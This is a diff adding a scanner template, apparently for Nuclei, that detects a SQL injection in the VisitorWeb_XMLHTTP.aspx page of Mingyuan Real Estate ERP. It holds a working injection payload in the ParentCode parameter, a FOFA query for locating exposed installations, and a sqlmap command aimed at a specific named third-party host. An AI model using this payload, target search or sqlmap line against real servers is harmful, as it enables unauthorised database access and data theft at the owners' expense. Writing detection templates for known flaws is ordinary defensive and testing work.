@@ -1,0 +1,24 @@
+id: mydc-erp-VisitorWeb-XMLHTTP-sqli
+
+info:
+  name: 明源地产 ERP VisitorWeb VisitorWeb_XMLHTTP.aspx - sql 注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  metadata:
+    verified: true
+    fofa-query: title="明源地产ERP" && icon_hash="-1520670993"
+    sqlmap: sqlmap -u "http://csmds.fz.xsjt.cn:7000/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=*" --batch
+  tags: mydc, sqli
+
+http:
+  - raw:
+      - |
+        GET /cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27zjiuvkdv%27));--&ywtype=GetParentProjectName HTTP/1.1
+        Host: {{Hostname}}        
+   
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1,"74c7a2e2bdb66bf480342690157b44bc")'
+
